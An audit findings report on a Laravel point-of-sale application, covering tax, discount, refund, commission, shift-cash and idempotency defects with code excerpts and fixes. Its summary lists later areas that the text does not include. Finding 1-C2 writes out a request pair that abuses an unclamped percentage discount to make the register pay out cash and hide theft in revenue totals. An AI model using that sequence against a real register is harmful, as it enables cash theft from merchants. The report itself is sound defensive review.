# POS Audit — Findings

Audit of the Laravel 13 / Livewire 4 / Vue 3 point-of-sale application per [AUDIT_PROMPT.md](AUDIT_PROMPT.md).
**Report only — no source file was modified.**

Every finding below was traced by reading the cited code. Findings are grouped by audit area,
**Critical → High → Medium → Low** within each. *Confirmed* means the full path was read and
traced; *Suspected* means pattern-matched and still needing verification. Areas that are clean are
said to be clean in one line rather than padded with speculation.

## Environment facts established up front (several severities depend on them)

| Fact | Evidence |
|---|---|
| Deployed DB is **MySQL**, not SQLite | [.env.example:23](.env.example#L23) `DB_CONNECTION=mysql`; [phpunit.xml:27](phpunit.xml#L27) same |
| `config/pos.php` has **no `tax` key** | `grep -i tax config/pos.php` → no match; top-level keys are `currency, timezone, calculation_scale, cash, documents, idempotency, purchasing` |
| Idempotency is wired to **exactly one** endpoint | `grep -rl IdempotencyGuard app/ routes/` → only [CartController.php](app/Http/Controllers/Api/V1/CartController.php) |
| `User::canOperateAt()` — the only location-scoping primitive — has **4 call sites** | `grep -rn canOperateAt app/` |
| The business-type scope has **3 call sites** | `grep -rn "forBusinessType\|soldByBusinessType" app/ resources/` |
| No `TODO`/`FIXME` anywhere in `app/`, `routes/`, `resources/` | `grep -rn "TODO\|FIXME\|@todo"` → 0 hits |
| Vitest suite passes | `npm run test` → `Test Files 5 passed (5) / Tests 68 passed (68)`, exit 0 |

Because MySQL is the real target, `lockForUpdate()` takes genuine row locks. The "SQLite makes
every lock a no-op" concern is therefore **config hygiene, not a live defect** — recorded as 1-L1.

## Summary of the worst findings

| # | Finding | Severity |
|---|---|---|
| [1-C1](#1-c1--critical--tax-inclusive-pricing-is-read-from-two-divergent-sources) | Enabling tax-inclusive pricing charges every customer tax twice | Critical |
| [1-C2](#1-c2--critical--manual-line-discount-is-never-clamped-to-the-line-gross) | Unclamped discount → negative sale total → register pays cash *out* | Critical |
| [2-C1](#2-c1--critical--remove_line-skips-the-delete-but-reports-success) | `remove_line` reports success without deleting — customer charged for a voided item, or the paid sale is destroyed | Critical |
| [2-C2](#2-c2--critical--a-401-on-an-expired-token-deletes-every-queued-offline-sale) | A 401 on an expired token deletes every queued offline sale | Critical |
| [3-C1](#3-c1--critical--a-stock-count-applies-a-stale-snapshot-as-a-delta) | Stock count applies an absolute measurement as a stale delta — silent inventory corruption | Critical |
| [3-H1](#3-h1--high--a-sale-can-commit-into-a-shift-that-is-closing) | Sale commits into a closing shift — cash invisible to the till report forever | High |
| [1-H6](#1-h6--high--a-cart-with-sale_type--return-decrements-stock-and-books-positive-revenue) | `sale_type=return` through the register decrements stock and books positive revenue | High |
| [4-H1](#4-h1--high--salesshifthistory-has-no-authorization-at-all)–[4-H4](#4-h4--high--salepolicy-and-stocklocationpolicyviewstock-are-location-blind) | Shift history unguarded; cross-location inventory writes and cross-location reads | High |
| [5-H1](#5-h1--high--csv-formula-injection-in-all-ten-report-exporters) | CSV formula injection in all ten report exporters | High |

---

# Area 1 — Money and financial correctness

## Confirmed

### 1-C1 · CRITICAL · Tax-inclusive pricing is read from two divergent sources

| Field | Content |
|---|---|
| **Severity** | Critical |
| **Location** | [CartPricer.php:149-152](app/Domain/Sales/CartPricer.php#L149-L152) vs [TaxEngine.php:30-33](app/Domain/Taxation/TaxEngine.php#L30-L33) |

**What's wrong.** Two components answer "do prices include tax?" from two different places, and one
of them can never be true. `TaxEngine` reads the admin-editable, DB-backed setting:

```php
// TaxEngine.php:30-33
public static function fromSettings(): self
{
    return new self(app(TaxSettings::class)->prices_include_tax);
}
```

`CartPricer` reads a **config key that does not exist**:

```php
// CartPricer.php:149-152
private function pricesIncludeTax(): bool
{
    return (bool) config('pos.tax.prices_include_tax', false);
}
```

`config/pos.php` has no `tax` key (verified by grep). So `CartPricer::pricesIncludeTax()` is
**hard-wired to `false` forever**, while `TaxEngine` follows the admin toggle exposed at
[tax-defaults.blade.php:7](resources/views/livewire/settings/tax-defaults.blade.php#L7).

**Why it matters.** An admin ticks "prices include tax". Shelf price 115.00, tax rate 15%.
`TaxEngine::taxFor` correctly *extracts* the tax using divisor `100+15`
([TaxEngine.php:115-121](app/Domain/Taxation/TaxEngine.php#L115-L121)): `115.00 × 15 ÷ 115 = 15.00`.
`CartPricer` then takes the `false` branch at [:94-96](app/Domain/Sales/CartPricer.php#L94-L96) and
*adds it back*: `lineTotal = 115.00 + 15.00 = 130.00`. **The customer is charged 130.00 for a
115.00 shelf price, on every line of every sale.** The tax report records 15.00 tax against a
115.00 base while 130.00 was collected, so the over-collection is invisible in the tax return.
Setting `POS_PRICES_INCLUDE_TAX=true` produces the identical result, because that env var feeds the
settings migration ([create_tax_settings.php:13](database/settings/2026_08_21_072918_create_tax_settings.php#L13)),
not the config key.

**Suggested fix.** Delete `CartPricer::pricesIncludeTax()` and read the same `TaxSettings` value
both sides use, so there is one source of truth. Add a test that flips the setting and asserts the
grand total is unchanged for an inclusive-priced line.

---

### 1-C2 · CRITICAL · Manual line discount is never clamped to the line gross

| Field | Content |
|---|---|
| **Severity** | Critical |
| **Location** | [CartPricer.php:138-147](app/Domain/Sales/CartPricer.php#L138-L147), [CompleteSaleAction.php:86-115](app/Domain/Sales/Actions/CompleteSaleAction.php#L86-L115) |

**What's wrong.** `discountFor()` applies a manual discount with no upper bound and no clamp to zero:

```php
// CartPricer.php:138-147
private function discountFor(Money $gross, string $value, string $type): Money
{
    if (bccomp($value, '0', 4) === 0) {
        return MoneySupport::zero();
    }

    return $type === 'fixed'
        ? MoneySupport::of($value)
        : MoneySupport::percentageOf($gross, $value);
}
```

`net = gross − manualDiscount` at [:49](app/Domain/Sales/CartPricer.php#L49) is never floored at
zero. Validation permits any magnitude — [ValidDecimal.php:25](app/Support/Money/Rules/ValidDecimal.php#L25)
accepts `^\d{1,15}(\.\d{1,4})?$`, so `150` (percent) and `1000000` (fixed) both pass. Note the
contrast: `PromotionEngine` clamps everywhere it apportions
([:342](app/Domain/Promotions/PromotionEngine.php#L342) `$share = $this->min($share, $netByLine[$lineNumber]);`)
— the *manual* path is the unguarded one. The completion guard only tests for **under**payment:

```php
// CompleteSaleAction.php:86-88
if ($requiresPayment && $paid->isLessThan($dueTotal)) {
    throw CheckoutException::underpaid((string) $dueTotal->minus($paid)->getAmount());
}
```

**Why it matters.** A cashier holding `sales.change_price` (or anyone with a stolen register token
from such a user) sends:

```
PATCH /api/v1/carts/91/lines/440   {"discount_type":"percent","discount_value":"150"}
POST  /api/v1/carts/91/complete    Idempotency-Key: <uuid>
```

On a single 10.00 line: `percentageOf(10.00, 150) = 15.00`, `net = −5.00`, total ≈ `−5.55`. With
**zero payments**, `paid = 0.00`; `0.00 < −5.55` is false, so the underpay guard passes.
`overpaid = 0.00 − (−5.55) = 5.55` ([:111-115](app/Domain/Sales/Actions/CompleteSaleAction.php#L111-L115)),
so the register instructs the cashier to **hand over 5.55 in cash** — and `$movesStock` is true, so
the item is decremented from stock and given away too. `discount_type=fixed, discount_value=1000000`
does the same at arbitrary scale. Repeated against throwaway carts this drives `SUM(sales.total)`
arbitrarily negative, masking cash theft in the revenue report.

**Suggested fix.** Clamp in `discountFor`: return `min($gross, $computed)`, mirroring
`PromotionEngine`'s `min()`. Independently, floor `net` at zero and reject a negative `total` for a
non-return sale type in `CompleteSaleAction`.

---

### 1-H1 · HIGH · Refund proration rounds an intermediate, blocking full refunds and short-paying customers

| Field | Content |
|---|---|
| **Severity** | High |
| **Location** | [RefundSaleAction.php:231-239](app/Domain/Sales/Actions/RefundSaleAction.php#L231-L239) |

**What's wrong.** The proration divides *before* it multiplies, and `Brick\Money::dividedBy` returns
a Money in the same 2-decimal context — so the quotient is rounded to whole cents first:

```php
// RefundSaleAction.php:231-239
$portion = fn (Money $value): Money => $value
    ->dividedBy((string) $line->quantity, RoundingMode::HalfUp)
    ->multipliedBy($quantity, RoundingMode::HalfUp);

$subtotal = $portion(MoneySupport::of($line->line_subtotal))->negated();
$discount = $portion(MoneySupport::of($line->discount_amount))->negated();
$tax      = $portion(MoneySupport::of($line->line_tax))->negated();
$total    = $portion(MoneySupport::of($line->line_total))->negated();
```

The correct order is multiply-then-divide, rounding once at the end. Each of the four fields is also
prorated independently, so the return row's own `subtotal + tax` need not equal its `total`.

**Why it matters.** Two concrete failures.

*Refund blocked entirely.* unit_price 10.00 × qty 3 = 30.00, tax 8.25% → `2.475 → 2.48`,
`line_total = 32.48 = sale.total`. Cashier refunds all 3 units: `32.48 ÷ 3 = 10.826… → 10.83`,
`× 3 = 32.49`. Then:

```php
// RefundSaleAction.php:76-78
if ($alreadyRefunded->plus($returnTotal->abs())->isGreaterThan($sale->total)) {
    throw CheckoutException::refundExceedsSaleTotal();
}
```

`0.00 + 32.49 > 32.48` → **the customer cannot be refunded at all**, and the cashier sees an error
implying the return exceeds the sale.

*Customer short-paid.* A line with `line_total = 10.00` at qty 3: `10.00 ÷ 3 = 3.33`, `× 3 = 9.99`.
The customer is refunded 9.99 on a 10.00 line and the sale is marked fully `refunded` — the missing
cent is unrecoverable.

**Suggested fix.** `$value->multipliedBy($quantity)->dividedBy($line->quantity, RoundingMode::HalfUp)`
— one rounding, at the end. Better still, prorate `total` only and derive the components with a
largest-remainder apportionment so the parts always sum to the whole (the pattern
[PromotionEngine.php:323-353](app/Domain/Promotions/PromotionEngine.php#L323-L353) already
implements correctly).

---

### 1-H2 · HIGH · `subtotal` is stored net of discount, then four consumers subtract the discount again

| Field | Content |
|---|---|
| **Severity** | High |
| **Location** | [CartPricer.php:113](app/Domain/Sales/CartPricer.php#L113); consumers at [CompleteSaleAction.php:143-145](app/Domain/Sales/Actions/CompleteSaleAction.php#L143-L145), [AwardLoyaltyPointsAction.php:33](app/Domain/Loyalty/Actions/AwardLoyaltyPointsAction.php#L33), [receipt.blade.php:126-132](resources/views/pdf/sales/receipt.blade.php#L126-L132), [Payment.vue:215](resources/js/pos/views/Payment.vue#L215) |

**What's wrong.** `CartPricer` defines `net = gross − manualDiscount − promotionDiscount`
([:49](app/Domain/Sales/CartPricer.php#L49), [:68](app/Domain/Sales/CartPricer.php#L68)) and then
sums **net** into `subtotal`:

```php
// CartPricer.php:113
$subtotal = $subtotal->plus($this->pricesIncludeTax() ? $parts['net']->minus($lineTax) : $parts['net']);
```

So `sales.subtotal` is *already* discount-free. Four consumers subtract it a second time:

```php
// CompleteSaleAction.php:143-145 -- the docblock above it says "Commission is on the
// net-of-discount, pre-tax amount", but subtotal IS that amount.
$commissionAmount = $commissionRate !== null
    ? MoneySupport::percentageOf($totals->subtotal->minus($totals->discountTotal), (string) $commissionRate)
    : MoneySupport::zero();
```
```php
// AwardLoyaltyPointsAction.php:33
$netSpend = $sale->subtotal->minus($sale->discount_total);
```
```js
// Payment.vue:215 -- comment says it is "kept consistent" with the commission basis;
// it faithfully copied the defect.
const tipBasis = computed(() => Math.max(0, Number(cart.cart?.totals.subtotal || 0) - Number(cart.cart?.totals.discount_total || 0)));
```

plus the receipt template, which prints `subtotal` and `discount` as separate lines that no longer
sum to `total`.

**Why it matters.** One line at 100.00, 10% line discount, 10% tax →
`gross 100.00, discount 10.00, net 90.00, tax 9.00, subtotal 90.00, total 99.00`.

- **The receipt does not reconcile on any discounted sale.** It prints
  `Subtotal 90.00 / Discount −10.00 / Tax 9.00 / Total 99.00`. The customer adds `90 − 10 + 9 = 89.00`
  and is charged 99.00. Same markup in [show.blade.php:104-107](resources/views/livewire/sales/show.blade.php#L104-L107).
- **Waiter commission is underpaid ~11%**: at a 5% rate, `percentageOf(90.00 − 10.00) = 4.00`
  instead of `4.50`.
- **Past 50% off, commission goes negative.** A 60% clearance discount gives basis `40 − 60 = −20.00`
  → `commission_amount = −2.00` on a genuine, non-refunded sale. `Money::percentageOf` does not
  clamp and there is no `max(0, …)` at the call site. That negative row flows into
  `withSum(..., 'commission_amount')` ([CommissionReportQuery.php:20](app/Domain/Reporting/Queries/CommissionReportQuery.php#L20))
  and **eats the waiter's commission earned on other sales** — three 60%-off items in a shift can
  make the report show a net negative payable.
- **The tip pad dies on the same bill**: `Math.max(0, −20)` = 0, so every tip-percent button
  suggests 0.00.
- **Loyalty accrual is under-awarded**: 80 points instead of 90.

Refunds stay self-consistent — [RefundSaleAction.php:90](app/Domain/Sales/Actions/RefundSaleAction.php#L90)
reuses the same formula against the same wrong-basis stored values, so the reversal mirrors the
forward figure exactly. Both sides are simply wrong by the same amount.

**Why it survived review:** no discount case is tested.
[WaiterCommissionTest.php:99](tests/Feature/Sales/WaiterCommissionTest.php#L99) asserts `'0.12'`
on an undiscounted 1.20 subtotal, and `grep -n discount tests/Feature/Sales/WaiterCommissionTest.php`
returns nothing. With zero discount the bug is invisible, since `subtotal − 0 == subtotal`.

**Suggested fix.** Decide one semantic and apply it consistently. Least disruptive: store `subtotal`
as the **gross** (pre-discount) sum so `subtotal − discount + tax = total` holds for the receipt and
all four consumers become correct as written. Whichever way, add a test asserting
`subtotal − discount_total + tax_total + rounding_adjustment == total`, and a commission test with a
60% discount.

---

### 1-H3 · HIGH · Refunds and voids never reverse gift-card balances, loyalty points, or promotion counters

| Field | Content |
|---|---|
| **Severity** | High |
| **Location** | [RefundSaleAction.php:51-204](app/Domain/Sales/Actions/RefundSaleAction.php#L51-L204), [VoidSaleAction.php:33-78](app/Domain/Sales/Actions/VoidSaleAction.php#L33-L78) |

**What's wrong.** `RefundSaleAction::execute` creates the return sale, return lines, tax rows, one
refund `Payment`, restocks, and updates the original's status. Read in full, it contains **no**
`GiftcardTransaction`, no `Giftcard` balance update, no `PointsTransaction`, no
`PromotionRedemption` reversal, and no `redemption_count`/`use_count` decrement. `VoidSaleAction`
restocks and marks payments `STATUS_VOIDED` with the same omissions.

**Why it matters.** A customer pays a 50.00 bill entirely with gift card `GC-000123`;
`RecordGiftcardRedemptionAction::commit` debits the card to 0.00. Next day the sale is refunded.
The refund `Payment` is written against whichever method the operator picks — and
[Refund.php:44-45](app/Livewire/Sales/Refund.php#L44-L45) *pre-selects* it when the sale had a
single method, so it defaults to the gift-card method — **but nothing credits the card.** The
customer's card stays at 0.00. If the operator picks cash instead, the customer walks out with
50.00 cash and the merchant has permanently lost 50.00 of gift-card float. Loyalty points earned on
the refunded sale likewise remain on the balance and can be spent again.

**Suggested fix.** In both actions, iterate the original sale's gift-card and points transactions
and write compensating entries inside the existing transaction; decrement promotion counters. If a
gift-card refund should re-credit the card, make the refund method non-editable when the original
payment was a gift card.

---

### 1-H4 · HIGH · Shift expected-cash ignores `change_given` and excludes refunds

| Field | Content |
|---|---|
| **Severity** | High |
| **Location** | [CloseShiftAction.php:74-80](app/Domain/Sales/Actions/CloseShiftAction.php#L74-L80) |

**What's wrong.** Expected cash sums `payments.amount` with no deduction for change handed back:

```php
// CloseShiftAction.php:74-80
$cashSales = MoneySupport::of((string) (DB::table('payments')
    ->join('sales', 'sales.id', '=', 'payments.sale_id')
    ->join('payment_methods', 'payment_methods.id', '=', 'payments.payment_method_id')
    ->where('sales.shift_id', $shift->id)
    ->where('payment_methods.counts_as_cash', true)
    ->where('payments.status', Payment::STATUS_CAPTURED)
    ->sum('payments.amount') ?: '0'));
```

Every `Payment` row is written with `'change_given' => MoneySupport::zero()`
([CompleteSaleAction.php:266](app/Domain/Sales/Actions/CompleteSaleAction.php#L266)); the real
figure goes only to the sale header. Separately, refunds are detached from the shift —
[RefundSaleAction.php:100-101](app/Domain/Sales/Actions/RefundSaleAction.php#L100-L101) sets
`'terminal_id' => null, 'shift_id' => null`, and the refund payment's status is `STATUS_REFUNDED`,
not `CAPTURED`, so it is excluded twice over.

**Why it matters.** Two independent shortage generators against the same counter:

- Bill is 17.50; a cash payment is posted with `amount = 20.00` and no `tendered` (an explicitly
  supported path per the code's own comment at [:90-96](app/Domain/Sales/Actions/CompleteSaleAction.php#L90-L96)).
  `change_given = 2.50`, cashier hands back 2.50, drawer holds 17.50 — but `expectedCash` adds the
  full 20.00. Variance −2.50.
- Cashier refunds 50.00 cash from the drawer at 14:00. `expectedCash` is 50.00 higher than the
  drawer. `cash_variance = −50.00` is recorded against that cashier as a shortage.

Both are silent, recurring, and blamed on the employee. See also 3-H1, which corrupts the same
number by a third route.

**Suggested fix.** Subtract `sales.change_given` for sales in the shift (or persist the real
`change_given` per payment row), and include cash refunds as a negative term — either by keeping
`shift_id` on the refund sale or by joining refunds through `returns_sale_id`.

---

### 1-H5 · HIGH · `roundToCashIncrement` is the identity function — Swedish rounding never happens

| Field | Content |
|---|---|
| **Severity** | High |
| **Location** | [Money.php:86-97](app/Support/Money/Money.php#L86-L97) |

**What's wrong.** `dividedBy` returns a Money in the **same 2-decimal context**, not an integer
quotient, so the round-trip is lossless and nothing is rounded:

```php
// Money.php:86-97
public static function roundToCashIncrement(BrickMoney $money, float $increment): BrickMoney
{
    if ($increment <= 0) {
        return $money;
    }

    $incrementString = self::fromFloat($increment);

    return $money
        ->dividedBy($incrementString, RoundingMode::HalfUp)
        ->multipliedBy($incrementString, RoundingMode::HalfUp);
}
```

`12.37 ÷ 0.05 = 247.4`, which fits scale 2 exactly as `247.40`; `247.40 × 0.05 = 12.37`. For any
increment of 0.05 / 0.10 / 0.25 / 1.00 this is a **no-op**.

**Why it matters.** An operator sets `POS_CASH_ROUNDING=0.05` because the smallest coin in
circulation is 5c — exactly the scenario the config comment at
[config/pos.php:25-27](config/pos.php#L25-L27) advertises. A cart totalling 12.37 still demands
12.37, which cannot be tendered in cash. Every cash sale is off by up to 2c against the drawer,
feeding the same variance as 1-H4. `sales.rounding_adjustment` is a permanently-zero column, so the
receipt's `@if (! $sale->rounding_adjustment->isZero())` block can never render. No test covers this
function (grep for `roundToCashIncrement` in `tests/` returns nothing).

**Suggested fix.** Do the division on a scale-0 `BigDecimal` (or use `Money::quotient()`), then
multiply back. Add a test asserting `12.37 → 12.35` at increment 0.05.

---

### 1-H6 · HIGH · A cart with `sale_type = 'return'` decrements stock and books positive revenue

| Field | Content |
|---|---|
| **Severity** | High |
| **Location** | [CompleteSaleAction.php:217-223](app/Domain/Sales/Actions/CompleteSaleAction.php#L217-L223), [Sale.php:150-153](app/Domain/Sales/Models/Sale.php#L150-L153) |

**What's wrong.** The stock delta is unconditionally negated; only the `reason` label branches on
the return type:

```php
// CompleteSaleAction.php:217-223
$this->inventory->record(
    item: $cartLine->item,
    stockLocationId: (int) $cartLine->stock_location_id,
    quantityDelta: bcmul((string) $cartLine->quantity, '-1', 3),
    reason: $sale->sale_type === Sale::TYPE_RETURN
        ? StockMovement::REASON_RETURN
        : StockMovement::REASON_SALE,
```

`sale_type` is client-settable — [CreateOrResumeCartRequest.php](app/Http/Requests/Api/V1/CreateOrResumeCartRequest.php)
allows `Rule::in(['pos','invoice','quote','work_order','return'])` — and `TYPE_RETURN` is in the
`$requiresPayment` list at [:72](app/Domain/Sales/Actions/CompleteSaleAction.php#L72), so
`$movesStock` is true. All money on that Sale is positive, and the revenue scope counts it:

```php
// Sale.php:150-153
public function scopeRevenue(Builder $query): Builder
{
    return $query->whereIn('sale_type', [self::TYPE_POS, self::TYPE_INVOICE, self::TYPE_RETURN]);
}
```

**Why it matters.** A client creates a cart with `sale_type=return`, one line at 40.00, and
completes it. The customer is required to **pay** 40.00, one unit is **removed** from stock instead
of restocked, and a `+40.00` return-type Sale is written that `scopeRevenue` sums as positive
revenue. This is the exact opposite of `RefundSaleAction`, whose docblock states "Every money field
on the return sale is negative… a negative return is what makes that sum come out correct." The two
return paths have opposite signs, so returns booked through the register corrupt both stock and the
revenue report.

Note also that `Cart::STATUS_ACTIVE` — the string `'active'` — appears in a **`sale_type`** list at
[:72](app/Domain/Sales/Actions/CompleteSaleAction.php#L72), which is dead but confirms that list was
not reasoned through.

**Suggested fix.** Either drop `'return'` from the accepted `sale_type` values on the cart endpoint
(forcing all returns through `RefundSaleAction`), or make `CompleteSaleAction` invert the sign of
the stock delta *and* all money fields when `sale_type === TYPE_RETURN`.

---

### 1-M1 · MEDIUM · `RecordSupplierInvoicePaymentAction` is an unguarded read-modify-write

| Field | Content |
|---|---|
| **Severity** | Medium |
| **Location** | [RecordSupplierInvoicePaymentAction.php:13-29](app/Domain/Purchasing/Actions/RecordSupplierInvoicePaymentAction.php#L13-L29) |

**What's wrong.** No transaction, no `lockForUpdate`, no re-read, and no overpayment guard:

```php
$newPaidTotal = MoneySupport::of($invoice->paid_total)->plus(MoneySupport::of($amount));

$invoice->update([
    'paid_total' => $newPaidTotal,
    'status' => $newPaidTotal->isGreaterThanOrEqualTo(MoneySupport::of($invoice->total))
        ? SupplierInvoice::STATUS_PAID
        : SupplierInvoice::STATUS_PARTIALLY_PAID,
]);
```

This is precisely the lost-update pattern `InventoryService`'s own docblock calls out as the legacy
system's cardinal sin. The caller adds nothing
([SupplierInvoices/Index.php:36-44](app/Livewire/Purchasing/SupplierInvoices/Index.php#L36-L44)).

**Why it matters.** Two AP clerks have invoice SI-001 (`total = 5000.00`, `paid_total = 0`) open.
Clerk A records 3000.00, clerk B records 2000.00 in the same second. Both read `paid_total = 0`.
Final stored value is 3000.00 *or* 2000.00, status `partially_paid`. **5000.00 left the bank; the
ledger shows 2000–3000 still outstanding**, and the supplier is paid a second time. Separately,
recording 50000.00 against a 5000.00 invoice is accepted and simply marks it `paid`.

**Suggested fix.** Wrap in `DB::transaction` with
`SupplierInvoice::whereKey($invoice->id)->lockForUpdate()->firstOrFail()` inside it, and reject
`paid_total > total` unless an explicit overpayment flag is passed.

---

### 1-M2 · MEDIUM · Idempotency: one call site, globally-scoped keys, and a vacuous request hash

| Field | Content |
|---|---|
| **Severity** | Medium |
| **Location** | [IdempotencyGuard.php:25-51](app/Support/Idempotency/IdempotencyGuard.php#L25-L51), [CartController.php:98-120](app/Http/Controllers/Api/V1/CartController.php#L98-L120) |

**What's wrong.** Four distinct issues in one component.

*(a) Only one endpoint uses it.* Grepping `app/` + `routes/` for `IdempotencyGuard` yields the
single invocation in `CartController::complete`. Unguarded money-movers include
`POST carts/{cart}/payments`, `PATCH carts/{cart}/tip`, `POST terminals/{terminal}/open-drawer`, and
every Livewire money action — refund, void, goods receiving, supplier-invoice payment, gift-card
top-up.

*(b) Keys are global, not per-terminal or per-user.*

```php
// IdempotencyGuard.php:28
$existing = IdempotencyKey::where('key', $key)->lockForUpdate()->first();
```

There is no `->where('user_id', …)`. `user_id` is *written* at [:43](app/Support/Idempotency/IdempotencyGuard.php#L43)
but never read back, and the migration declares `$table->string('key')->unique();`. Because the
combined hash embeds `"carts.{$cart->id}.complete"`, two terminals that pick the same key value for
different carts produce different hashes and the second gets
`IdempotencyConflictException::mismatchedRequest()` → **HTTP 409 for 48 hours** on a completely
legitimate sale. Nothing forces a UUID — [:102-103](app/Http/Controllers/Api/V1/CartController.php#L102-L103)
only checks `blank($key)` — so any terminal-local counter scheme (`"1"`, `"txn-42"`) collides
near-certainly. **This is the "one terminal can block another's legitimate request" case the brief
asked about, and it is real.**

*(c) The request hash cannot detect key reuse with a different payload on this endpoint.*
`POST /complete` takes no body, so `hash('sha256', $request->getContent() ?: '{}')` is constant. The
real payload is the mutable cart state in the database, which is never hashed.

*(d) Concurrent double-submit is check-then-act.* Read at `:28`, execute at `:39`, write at `:41`.
On a **first-use** key the `SELECT … FOR UPDATE` matches no row, so it takes only a gap lock — and
gap locks are mutually compatible. Two simultaneous requests with the same key therefore **both run
the money-moving callback**. What actually saves it is the `unique` index on `sales.client_uuid`
causing the loser to violate and roll back — surfacing as an **unhandled `QueryException` → HTTP 500**
rather than a 409 or a replayed 201. Correct outcome, wrong mechanism, wrong status code.

**Why it matters.** The one property the layer was built to provide — "a terminal can safely retry a
checkout" — holds only for `complete`, and the offline sync engine retries the *unprotected*
endpoints instead (see 2-H2). Meanwhile a naive key scheme locks out a second terminal for two days.

**Suggested fix.** Scope uniqueness to `(user_id, key)` or `(terminal_id, key)` and filter the
lookup by the same. Extend the guard to the payment/tip/drawer endpoints. Catch the unique violation
and convert it to the replay path rather than letting it 500.

**Clean, for the record:** the guard's transaction scoping is correct — `DB::transaction` wraps both
the callback and the key write, so the Sale and the cached response commit or roll back together. A
replayed live key returns the cached response without re-running the callback, which is correct
idempotent semantics, not a stale re-mutation.

---

### 1-M3 · MEDIUM · `CompleteSaleAction` checks cart status outside its transaction and never locks the cart

| Field | Content |
|---|---|
| **Severity** | Medium |
| **Location** | [CompleteSaleAction.php:56-58](app/Domain/Sales/Actions/CompleteSaleAction.php#L56-L58) vs the transaction opening at [:117](app/Domain/Sales/Actions/CompleteSaleAction.php#L117) |

**What's wrong.** The `STATUS_COMPLETED` guard runs on the route-model-bound instance *before* the
transaction opens; inside it the cart is only written, never re-read under a lock. Contrast
`CreateOrResumeCartAction.php:33`, `RefundSaleAction.php:52` and `VoidSaleAction.php:34`, which all
re-fetch under `lockForUpdate` inside their transaction.

**Why it matters.** Two terminals can both resume suspended cart U (`CreateOrResumeCartAction`
accepts `suspended` and simply re-stamps `terminal_id`/`shift_id`/`user_id`, so the second silently
steals the cart), then both POST `/complete` with **different** Idempotency-Keys. Both reach
`Sale::create`. The `unique` index on `sales.client_uuid` prevents the duplicate sale and rolls the
loser back entirely — data is safe — but the failure surfaces as an **unhandled 500**, which the
offline PWA's retry logic cannot interpret (and per 2-H3 responds to by destroying the queue). Note
that `client_uuid` is `nullable` and `RefundSaleAction` creates its Sale **without** one, so refunds
have no such backstop.

**Suggested fix.** Move the status check inside the transaction and re-read with
`Cart::whereKey($cart->id)->lockForUpdate()->firstOrFail()` before pricing. Render
`UniqueConstraintViolationException` as a 409 (see 3-M2).

---

### 1-M4 · MEDIUM · `MoneyCast` silently truncates `decimal(19,4)` columns to 2 decimals

| Field | Content |
|---|---|
| **Severity** | Medium |
| **Location** | [Money.php:43-47](app/Support/Money/Money.php#L43-L47), [MoneyCast.php:29](app/Support/Money/MoneyCast.php#L29) |

**What's wrong.** `BrickMoney::of` is called with no `Context`, so `DefaultContext` applies the
currency's 2 fraction digits, and every `multipliedBy`/`dividedBy` rounds to that scale at every step:

```php
// Money.php:43-47
return BrickMoney::of(
    is_float($amount) ? self::fromFloat($amount) : (string) $amount,
    self::currency(),
    roundingMode: RoundingMode::HalfUp,
);
```

Both `get` and `set` on the cast route through it. Yet the columns are `decimal(19,4)` and
`ValidDecimal` explicitly permits 4 decimals ("matching the money-column scale (decimal(19,4))" per
its own docblock).

**Why it matters.** An admin enters `unit_price = 1.2999` (per-litre fuel, per-gram deli pricing).
The form accepts it; `MoneyCast::set` stores `1.30`; reloading shows `1.30`. At 100 units the
customer pays 130.00 instead of 129.99, and the entered price is gone with no warning.

Corollary: `config/pos.php`'s `'calculation_scale' => 4` — documented as keeping intermediate
arithmetic "above the currency's minor unit so a chain of line-level calculations does not accumulate
rounding error" — is read only inside `fromFloat`, whose output is immediately re-rounded to 2 by
`BrickMoney::of`. **No intermediate arithmetic anywhere runs at scale 4; the documented protection
does not exist.** Relatedly `Money::round()` ([:63-66](app/Support/Money/Money.php#L63-L66)) converts
a Money to *its own* context and is a guaranteed no-op; it has zero call sites, so it is harmless
dead code, but its comment ("the only place rounding is applied to a total") is false in both
directions.

**Suggested fix.** Either pass an explicit `CustomContext(4)` and round to 2 only at the final total,
or narrow the columns and `ValidDecimal` to 2 decimals so the contract matches the behaviour. The
current state promises 4 and delivers 2.

---

### 1-L1 · LOW · `config/database.php` defaults to SQLite, where `lockForUpdate()` compiles to nothing

| Field | Content |
|---|---|
| **Severity** | Low |
| **Location** | [config/database.php:20](config/database.php#L20) |

**What's wrong.** `'default' => env('DB_CONNECTION', 'sqlite')`. Laravel's
`SQLiteGrammar::compileLock()` returns `''`, so on SQLite every `lockForUpdate()` in the 23 sites
across the codebase is a silent no-op — including the ones whose docblocks name the lock as the sole
correctness mechanism.

**Why it matters — and why this is Low, not Critical.** Both `.env.example:23` and `phpunit.xml:27`
pin `DB_CONNECTION=mysql`, so neither production nor CI ever runs on SQLite. The exposure is limited
to a developer who copies no env file and gets the framework default, silently losing every row lock
while their tests still pass.

**Suggested fix.** Change the default to `mysql`, or assert at boot that the driver supports
`SELECT … FOR UPDATE`.

---

### 1-L2 · LOW · Intermediate rounding in `percentageOf` and `taxFor`

| Field | Content |
|---|---|
| **Severity** | Low |
| **Location** | [Money.php:77-78](app/Support/Money/Money.php#L77-L78), [TaxEngine.php:119-121](app/Domain/Taxation/TaxEngine.php#L119-L121) |

**What's wrong.** `multipliedBy` rounds the product to 2 decimals *before* the divide by ~100
(`33.33 × 8.25 = 274.9725 → 274.97`, then `÷ 100`).

**Why it matters.** The residual error is ≤ 0.00005 and cannot change the final cent except on an
exact half-cent tie, so real-world impact is negligible — but it is the same defect class as 1-H1.
[PromotionEngine.php:340-341](app/Domain/Promotions/PromotionEngine.php#L340-L341) already does it
correctly, computing the ratio via `bcdiv(…, 10)` at scale 10 before touching Money.

**Suggested fix.** Compute into a `BigRational`/higher scale and round once at the end.

## Area 1 — verified clean

- **No float or int money arithmetic anywhere in scope.** Swept the seven money domains and `app/Support/Money` for `(float)`, `floatval`, `round(`, `floor(`, `ceil(`, `number_format`, `array_sum` and bare arithmetic on amounts: three hits, all legitimate (a `(float)` on a config *increment*, `number_format` inside the deliberate float→string funnel, and the dead `round` helper). Every division passes an explicit `RoundingMode`.
- **No unguarded currency mismatch is reachable.** Every `plus`/`minus` operand originates from `MoneySupport::of`/`zero()`, which pins one currency from `config('pos.currency')`. There is no multi-currency path, so `Brick`'s `ContextMismatchException` cannot fire.
